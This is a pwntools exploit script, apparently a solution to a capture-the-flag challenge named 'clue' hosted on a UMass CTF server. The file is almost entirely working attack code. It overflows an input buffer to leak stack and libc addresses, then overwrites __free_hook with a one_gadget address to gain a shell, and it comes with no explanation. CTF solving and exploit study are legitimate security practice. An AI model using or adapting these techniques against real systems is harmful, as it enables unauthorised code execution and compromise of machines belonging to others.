from pwn import *
from icecream import ic

elf = exe = ELF("./clue_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("pwn.ctf.umasscybersec.org", 9001)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *remove_item
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

# io = start()

def parse_data():
    items = []
    characters = []
    ru("Items: \n")
    item = rl()
    while item != b"\n":
        item = item.strip()
        items.append(item)
        item = rl()
    rl()
    character = rl()
    while character != b"\n":
        character = character.strip()
        characters.append(character)
        character = rl()
    rl()
    return items, characters

def move(direction):
    sl(b"go " + direction)

def guess(character, item):
    sl(b"clue " + character + " " + item)

def drop(item):
    sl(b"drop " + item)

def view_inventory():
    sl(b"inventory")

def view_list():
    sl(b"list")

def look_room():
    sl(b"look")

def current_room():
    sl(b"room")

def pickup(item):
    sl(b"take " + item)


while True:
    try:
        io = start()
        items = []
        characters = []

        items, characters = parse_data()
        sl(b'a'*0x150)

        sl(b'room')
        ru("Room name: ")
        stack_address = uu64(6)
        ic(hex(stack_address))
        ic(hex(stack_address & 0xf0000000000))
        if stack_address & 0xf0000000000 != 0xf0000000000:
            raise EOFError
        break
    except EOFError:
        io.close()

rooms = [b"kitchen", b"ballroom", b"conservatory", b"worcester", b"billiards", b"library", b"lounge", b"hall", b"study"]
while True:
    stack_address += 0x38
    sl(b'a'*0x148 + b'a'*8 + p64(stack_address))
    sl(b'room')
    ru("Room name: ")
    curr = rl().strip()
    if curr not in rooms:
        ic(curr)
        break

stack_address -= 0x4f8
sl(b'a'*0x20 + p64(stack_address + 0x518) + b'a'*0x128 + p64(stack_address))
sl(b'room')
ru("Room name: ")
libc.address = uu64(6) - 0x24083
ic(hex(libc.address))


sl(b'a'*0x150 + p64(stack_address + 0x4f8 - 0x38) + b'a'*0x20 + p64(libc.sym['__free_hook']-0x30))

sl(b'a'*0x30 + p64(libc.address + 0xe3b01))

sl(b'look')
items, characters = parse_data()
for i in range(0, len(items)):
    pickup(items[i])


io.interactive()
